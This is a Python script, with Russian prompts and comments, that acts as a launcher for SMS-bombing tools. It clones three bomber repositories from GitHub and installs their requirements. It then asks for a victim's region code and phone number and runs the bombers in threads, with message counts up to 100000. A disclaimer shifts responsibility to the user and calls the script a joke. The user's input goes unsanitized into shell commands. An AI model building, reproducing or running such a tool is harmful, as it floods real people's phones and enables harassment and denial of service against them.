import subprocess
import os
import getpass
import sys
from threading import Thread
import time
from colorama import Fore, Back
from tkinter import filedialog

clearmode = '0'

def clicked():
    global UP
    UP = filedialog.askdirectory()
    UP = UP + '/BomberClient/'
    print(UP)
    #text.configure(text='YOU CAN CLOSE THIS WINDOW NOW')
    


sysname = sys.platform
if sys.platform == 'win32':
    clearmode = 'CLS'
if sys.platform == 'Linux':
    clearmode = 'clear'

checkBila = False
checkB3 = False
checkYASB = False
def Download():
    time.sleep(5)
    os.mkdir(UP)
    os.chdir(UP)
    print('  \nЗагрузка бомберов...')
    if checkYASB == False:
        subprocess.call(f'git clone https://github.com/AvinashReddy3108/YetAnotherSMSBomber', shell=True)
        print('Установлен YASB(YetAnotherSMSBomber)')
        os.chdir(UP + 'YetAnotherSMSBomber')
        os.system(f'pip install -r requirements.txt')
        os.chdir(UP)
    if checkB3 == False:
        os.system(f'git clone https://github.com/iMro0t/bomb3r.git')
        os.chdir(UP + 'bomb3r')
        os.system(f'pip install -r requirements.txt')
        print('Установлен bomb3r')
        os.chdir(UP)
    if checkBila == False:
        subprocess.call(f'git clone https://github.com/Snekyy/bombila.git', shell=True)
        os.chdir(UP + 'bombila')
        os.system(f'pip install -r requirements.txt')
        os.chdir(UP)

 #Функция экрана ввода номера телефона 
RC = 0
num = 0
    
def logo():
    os.system(clearmode)
    print(" ________  _____ ______   ________  ________     ")
    print("|\   __  \|\   _ \  _   \|\   __  \|\   ____\    ")
    print("\ \  \|\  \ \  \\\__\ \  \ \  \|\ /\ \  \___|    ")
    print(" \ \   _  _\ \  \\|__| \  \ \   __  \ \  \       ")
    print("  \ \  \\  \\ \  \    \ \  \ \  \|\  \ \  \____  ")
    print("   \ \__\\ _\\ \__\    \ \__\ \_______\ \_______\ ")
    print("    \|__|\|__|\|__|     \|__|\|_______|\|_______|  ")
    print("re1mu's Main Bombers Client")




logo()
print(Fore.RED + 'Download Mode' + Fore.RESET)
time.sleep(2)
name = getpass.getuser()

UP = 'def'
clicked()

if os.path.isdir(UP):
    logo()

    os.chdir(UP)
    print('ver 0.1\n')
    print(UP)
    #стоит создать переменные кода региона, номер без региона и полный номер(разные бомберы юзают разный формат ввода номера)
    RC = input(Fore.BLACK + Back.GREEN + 'Введите код Региона без +() -->' + Back.RESET + Fore.RESET)
    num = input(Fore.BLACK + Back.GREEN + 'Введите номер() -->' + Back.RESET + Fore.RESET)
    str(num)
    str(RC)

# начало использования бомберов

    print(Fore.BLACK + Back.YELLOW +    '                             !ВНИМАНИЕ!                          ' + Back.RESET)
    print(Back.YELLOW + name + ', только ты несешь ответственность за эти действия. Я всего ' + Back.RESET)
    print(Back.YELLOW + 'лишь предоставляю возможность увидеть  работу бомберов, и мою тво' + Back.RESET)
    print(Back.YELLOW + 'рческую работу////. Все бомберы настроены на минимальный вред жер' + Back.RESET)
    print(Back.YELLOW + 'твы. Ведь изначально этот скрипт  создавался в  качестве шутки...' + Back.RESET)
    print(Back.YELLOW + 'Я надеюсь ты понимаешь, что сейчас делаешь.' + Back.RESET + Fore.RESET)
    def YASB():
        os.chdir(UP + 'YetAnotherSMSBomber')
        os.system('python3 bomber.py -N 1000 -C ' + RC + ' -T 15 -t 10 ' + num)
    YASBTh = Thread(target=YASB)
    YASBTh.start()
    def B3():
        os.chdir(UP + 'bomb3r')
        os.system('python3 bomber.py --sms 100000 -C ' + RC + ' -T 15 ' + num)
    B3Th = Thread(target=B3)
    B3Th.start()
    def BILA():
      os.chdir(UP + 'bombila')
      os.system('python3 bombila.py -c ' + RC + '-p ' + num + '-t 700 --threads 1007 -T 3')




#первый запуск скрипта  
else:
    clicked()
    print('  \nПапки клиента не существует, создание папки и установка бомберов')
    Download()
    logo()
    print('reboot program now')











#ссылки на бомберы
    #
    # https://github.com/Snekyy/bombila.git


